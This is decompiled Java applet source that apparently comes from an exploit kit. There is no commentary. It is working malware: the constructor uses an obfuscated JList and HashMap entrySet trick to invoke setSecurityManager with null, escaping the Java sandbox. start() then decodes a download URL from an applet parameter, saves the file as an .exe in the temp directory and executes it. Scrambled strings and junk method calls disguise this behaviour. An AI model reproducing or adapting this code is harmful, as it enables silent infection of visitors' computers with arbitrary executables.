import java.util.Map;
import java.awt.Component;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Goo extends Applet
{
    String onsf;
    JList orndsa;
    
    private void glnsas() {
        final int sso = 0;
    }
    
    @Override
    public void start() {
        super.start();
        try {
            this.glnsas();
            String lnponiwk = System.getProperty("jalpknesaeva.ilpknesaeo.tlpknesaempdlpknesaeir".replace("lpknesae", ""));
            this.glnsas();
            if (lnponiwk.charAt(lnponiwk.length() - 1) != '\\') {
                lnponiwk += "\\";
            }
            this.glnsas();
            final String kpkwww = lnponiwk + "vflpknesaef.exlpknesaee".replace("lpknesae", "");
            this.glnsas();
            this.glnsas();
            final String pojpojt = this.getParameter("deoinpwedst".replace("oinpwed", ""));
            this.glnsas();
            String pfotnt = "";
            this.glnsas();
            for (int s = 0; s < pojpojt.length(); ++s) {
                int jds = pojpojt.charAt(s);
                jds -= 4;
                pfotnt += (char)jds;
            }
            this.glnsas();
            this.glnsas();
            final InputStream phbsef = Sopil.Olsko(pfotnt);
            this.glnsas();
            final int afqw = 0;
            this.glnsas();
            final FileOutputStream oheh33 = new FileOutputStream(kpkwww);
            this.glnsas();
            byte[] llnponiwk = new byte[153601];
            this.glnsas();
            int dgg = 0;
            this.glnsas();
            int sgsggg = 0;
            this.glnsas();
            this.glnsas();
            while ((sgsggg = phbsef.read(llnponiwk)) > 0) {
                oheh33.write(llnponiwk, 0, sgsggg);
                this.glnsas();
                llnponiwk = new byte[153601];
                this.glnsas();
                dgg += sgsggg;
                this.glnsas();
            }
            this.glnsas();
            oheh33.close();
            this.glnsas();
            phbsef.close();
            this.glnsas();
            try {
                this.glnsas();
                Sopil.LksLL(kpkwww);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    private void pororrkmd() {
        Boolean a = true;
        if (a) {
            a = true;
        }
    }
    
    public Goo() {
        final Object plpkmrq = System.class;
        final Object[] pknpkttq = { null };
        this.pororrkmd();
        this.pororrkmd();
        this.pororrkmd();
        int asd = 0;
        asd = 1;
        final String knpkwsa = "sonnoginw3etonnoginw3Seonnoginw3curonnoginw3ityMaonnoginw3naonnoginw3ger".replace("onnoginw3", "");
        final Sjyaw ponsad = new Sjyaw(plpkmrq, knpkwsa, pknpkttq);
        final HashSet aaas = new HashSet();
        aaas.add(ponsad);
        final int mnnsa = 1232;
        final Map oiuhg = new HashMap() {
            @Override
            public Set entrySet() {
                return aaas;
            }
        };
        this.orndsa = new JList((E[])new Object[] { oiuhg });
        final int c = 11;
        this.add(this.orndsa);
        try {
            Thread.sleep(3000L);
        }
        catch (Exception ex) {}
    }
}
